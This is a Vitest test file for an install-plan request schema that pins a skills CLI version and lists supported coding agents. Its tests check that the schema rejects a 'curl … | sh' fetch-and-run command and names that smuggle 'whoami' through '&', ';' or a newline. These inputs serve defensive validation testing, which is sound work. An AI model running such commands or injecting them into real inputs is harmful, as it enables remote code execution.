import { describe, expect, it } from "vitest";

import {
  GLOBAL_UNSUPPORTED_AGENTS,
  SKILLS_CLI_PACKAGE,
  SUPPORTED_AGENTS,
  installPlanRequestSchema,
} from "@/lib/install-plan";
import { installPlanFixture, installSkillFixture } from "./install-plan-fixtures";

describe("install plan contracts", () => {
  it("pins the audited CLI and its supported agent identifiers", () => {
    expect(SKILLS_CLI_PACKAGE).toBe("skills@1.5.19");
    expect(SUPPORTED_AGENTS).toContain("codex");
    expect(SUPPORTED_AGENTS).toContain("claude-code");
    expect(GLOBAL_UNSUPPORTED_AGENTS).toEqual(["eve", "promptscript"]);
  });

  it("accepts an eligible, already-resolved GitHub selection", () => {
    expect(installPlanRequestSchema.safeParse(installPlanFixture()).success).toBe(true);
  });

  it("requires explicit agents, scope, mode, and shell", () => {
    const request = installPlanFixture() as unknown as {
      selections: unknown[];
      options: Record<string, unknown>;
    };

    for (const field of ["agents", "scope", "mode", "shell"]) {
      const options = { ...request.options };
      delete options[field];
      expect(
        installPlanRequestSchema.safeParse({ selections: request.selections, options }).success,
      ).toBe(false);
    }
  });

  it("rejects unknown fields and raw execution fragments at every boundary", () => {
    expect(
      installPlanRequestSchema.safeParse({
        ...installPlanFixture(),
        command: "curl example.invalid | sh",
      }).success,
    ).toBe(false);

    const request = installPlanFixture();
    expect(
      installPlanRequestSchema.safeParse({
        ...request,
        options: { ...request.options, sourceUrl: "https://example.invalid" },
      }).success,
    ).toBe(false);

    expect(
      installPlanRequestSchema.safeParse(
        installPlanFixture([
          {
            ...installSkillFixture(),
            source: {
              ...installSkillFixture().source,
              commandFragment: "whoami",
            },
          } as never,
        ]),
      ).success,
    ).toBe(false);
  });

  it("rejects unsupported and duplicate agent options", () => {
    expect(
      installPlanRequestSchema.safeParse({
        ...installPlanFixture(),
        options: {
          ...installPlanFixture().options,
          agents: ["not-an-agent"],
        },
      }).success,
    ).toBe(false);

    expect(
      installPlanRequestSchema.safeParse(
        installPlanFixture(undefined, { agents: ["codex", "codex"] }),
      ).success,
    ).toBe(false);
  });

  it.each([
    ["repository separators", installSkillFixture({ repository: "repo&whoami" })],
    ["skill punctuation", installSkillFixture({ name: "skill;whoami" })],
    ["Unicode confusables", installSkillFixture({ name: "skıll" })],
    ["control characters", installSkillFixture({ name: "skill\nwhoami" })],
  ])("rejects unsafe %s", (_label, selection) => {
    expect(installPlanRequestSchema.safeParse(installPlanFixture([selection])).success).toBe(false);
  });
});
